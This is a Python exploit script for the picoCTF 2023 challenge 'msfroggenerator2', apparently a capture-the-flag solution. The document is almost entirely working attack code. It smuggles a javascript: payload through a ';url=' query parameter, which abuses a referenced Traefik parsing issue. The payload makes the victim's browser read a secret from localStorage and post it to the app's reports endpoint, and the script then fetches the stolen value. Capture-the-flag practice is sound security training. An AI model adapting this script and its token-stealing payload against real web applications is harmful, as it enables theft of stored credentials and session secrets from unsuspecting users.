# picoCTF 2023: msfroggenerator2

import time
from urllib.parse import quote

import requests

TARGET = "http://saturn.picoctf.net:54915/"

payload = 'javascript:fetch("/api/reports/add",{method:"POST",headers:{"Content-Type":"application/json",Authorization:`Bearer ${localStorage.getItem("flag")}`},body:JSON.stringify({screenshot:localStorage.getItem("flag")})})'

# https://github.com/traefik/traefik/issues/9164
r = requests.get(TARGET + "report?id=;url=" + quote(payload))
print(r.text)

time.sleep(7)
r = requests.get(TARGET + "api/reports/get")
print(r.json())
